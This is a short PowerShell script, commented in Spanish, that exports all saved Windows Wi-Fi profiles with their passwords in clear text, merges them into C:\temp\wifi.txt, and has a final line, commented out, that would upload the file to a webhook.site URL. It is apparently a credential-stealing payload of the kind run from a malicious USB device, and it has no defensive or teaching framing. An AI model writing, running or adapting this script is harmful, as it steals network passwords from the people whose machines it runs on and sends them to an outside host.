# Abre una nueva ventana de consola y ejecuta los comandos
Start-Process -FilePath 'cmd' -ArgumentList '/c cd /d C:\' -PassThru
Start-Sleep -Seconds 3

if (!(Test-Path C:\temp)) {
    Start-Process -FilePath 'cmd' -ArgumentList '/c mkdir C:\temp' -PassThru
    Start-Sleep -Seconds 2
}

# # Exporta los perfiles WLAN a la carpeta temp
Start-Process -FilePath 'cmd' -ArgumentList '/c netsh wlan export profile key=clear folder=C:\temp' -PassThru
Start-Sleep -Seconds 2

# Copia todos los archivos .xml a wifi.txt
Start-Process -FilePath 'cmd' -ArgumentList '/c type C:\temp\*.xml > C:\temp\wifi.txt' -PassThru
Start-Sleep -Seconds 2

# Envia wifi.txt a la URL del webhook
#Invoke-WebRequest -Uri https://webhook.site/a4129892-d9a6-475a-8230-8aeda5d2f3bd -Method POST -InFile C:\temp\wifi.txt
